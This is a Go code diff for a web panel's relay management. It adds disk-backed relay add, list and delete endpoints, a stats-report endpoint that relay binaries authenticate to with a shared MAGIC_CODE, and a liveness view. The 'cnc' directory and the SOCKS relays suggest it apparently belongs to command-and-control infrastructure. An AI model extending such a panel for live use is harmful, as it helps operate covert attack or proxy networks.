@@ -426,6 +426,8 @@ func NewWebMux() http.Handler {
 	mux.HandleFunc("/api/events", requireWebAuth(handleSSE))
 	mux.HandleFunc("/api/users", requireOwner(handleAPIUsers))
 	mux.HandleFunc("/api/relays", requireAdmin(handleAPIRelays))
+	mux.HandleFunc("/api/relay-report", handleRelayReport)
+	mux.HandleFunc("/api/relays/stats", requireWebAuth(handleAPIRelayStats))
 	mux.HandleFunc("/api/tasks", requireAdmin(handleAPITasks))
 	mux.HandleFunc("/api/me", requireWebAuth(handleAPIMe))
 	mux.HandleFunc("/api/auth/apikey", handleAPIAuthByKey)
@@ -1342,43 +1344,137 @@ func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-// handleAPIRelays returns the baked-in relay endpoints from setup.py.
+// handleAPIRelays manages the relay list stored in cnc/db/relays.json.
+// GET  — return all relay entries
+// POST — add a relay {name, host, controlPort, socksPort}
+// DELETE — remove a relay ?id=<uuid>
 func handleAPIRelays(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	if bakedRelayEndpoints == "" {
+	switch r.Method {
+	case http.MethodGet:
+		relaysMu.RLock()
+		entries := make([]RelayEntry, len(relaysCache))
+		copy(entries, relaysCache)
+		relaysMu.RUnlock()
+		if entries == nil {
+			entries = []RelayEntry{}
+		}
+		json.NewEncoder(w).Encode(entries)
+
+	case http.MethodPost:
+		var req struct {
+			Name        string `json:"name"`
+			Host        string `json:"host"`
+			ControlPort string `json:"controlPort"`
+			SocksPort   string `json:"socksPort"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Host == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "host required"})
+			return
+		}
+		if req.ControlPort == "" {
+			req.ControlPort = "9001"
+		}
+		if req.SocksPort == "" {
+			req.SocksPort = "1080"
+		}
+		if req.Name == "" {
+			relaysMu.RLock()
+			req.Name = fmt.Sprintf("Relay-%d", len(relaysCache)+1)
+			relaysMu.RUnlock()
+		}
+		b := make([]byte, 4)
+		rand.Read(b)
+		entry := RelayEntry{
+			ID:          fmt.Sprintf("%x", b),
+			Name:        req.Name,
+			Host:        req.Host,
+			ControlPort: req.ControlPort,
+			SocksPort:   req.SocksPort,
+			AddedAt:     time.Now(),
+		}
+		relaysMu.Lock()
+		relaysCache = append(relaysCache, entry)
+		relaysMu.Unlock()
+		saveRelaysToDisk()
+		writeJSON(w, http.StatusOK, entry)
+
+	case http.MethodDelete:
+		id := r.URL.Query().Get("id")
+		if id == "" {
+			writeJSON(w, http.StatusBadRequest, map[string]string{"error": "id required"})
+			return
+		}
+		relaysMu.Lock()
+		var updated []RelayEntry
+		for _, e := range relaysCache {
+			if e.ID != id {
+				updated = append(updated, e)
+			}
+		}
+		relaysCache = updated
+		relaysMu.Unlock()
+		saveRelaysToDisk()
+		writeJSON(w, http.StatusOK, map[string]bool{"ok": true})
+
+	default:
+		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "method not allowed"})
+	}
+}
+
+// handleRelayReport receives periodic stats POSTed by relay binaries.
+// Authenticated via X-Relay-Key header matching MAGIC_CODE.
+func handleRelayReport(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "POST only"})
+		return
+	}
+	if r.Header.Get("X-Relay-Key") != MAGIC_CODE {
+		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "unauthorized"})
+		return
+	}
+	var stats RelayStats
+	if err := json.NewDecoder(r.Body).Decode(&stats); err != nil {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json"})
+		return
+	}
+	stats.LastSeen = time.Now()
+	stats.Up = true
+	relayStatsMu.Lock()
+	relayStatsCache[stats.Name] = stats
+	relayStatsMu.Unlock()
+	writeJSON(w, http.StatusOK, map[string]bool{"ok": true})
+}
+
+// handleAPIRelayStats returns the relay list merged with live stats.
+// Relays not seen in the last 90s are marked Up: false.
+func handleAPIRelayStats(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+	relaysMu.RLock()
+	entries := make([]RelayEntry, len(relaysCache))
+	copy(entries, relaysCache)
+	relaysMu.RUnlock()
+
+	type merged struct {
+		RelayEntry
+		RelayStats
+	}
+	out := make([]merged, 0, len(entries))
+	now := time.Now()
+	for _, e := range entries {
+		relayStatsMu.RLock()
+		st, ok := relayStatsCache[e.Name]
+		relayStatsMu.RUnlock()
+		if ok && now.Sub(st.LastSeen) > 90*time.Second {
+			st.Up = false
+		}
+		out = append(out, merged{RelayEntry: e, RelayStats: st})
+	}
+	if out == nil {
 		w.Write([]byte("[]"))
 		return
 	}
-	type relayEntry struct {
-		Name        string `json:"name"`
-		Host        string `json:"host"`
-		ControlPort string `json:"controlPort"`
-		SocksPort   string `json:"socksPort"`
-	}
-	var relays []relayEntry
-	for i, ep := range strings.Split(bakedRelayEndpoints, ",") {
-		ep = strings.TrimSpace(ep)
-		if ep == "" {
-			continue
-		}
-		parts := strings.Split(ep, ":")
-		host := parts[0]
-		cp := "9001"
-		sp := "1080"
-		if len(parts) >= 2 {
-			cp = parts[1]
-		}
-		if len(parts) >= 3 {
-			sp = parts[2]
-		}
-		relays = append(relays, relayEntry{
-			Name:        fmt.Sprintf("Relay-%d", i+1),
-			Host:        host,
-			ControlPort: cp,
-			SocksPort:   sp,
-		})
-	}
-	json.NewEncoder(w).Encode(relays)
+	json.NewEncoder(w).Encode(out)
 }
 
 // ============================================================================
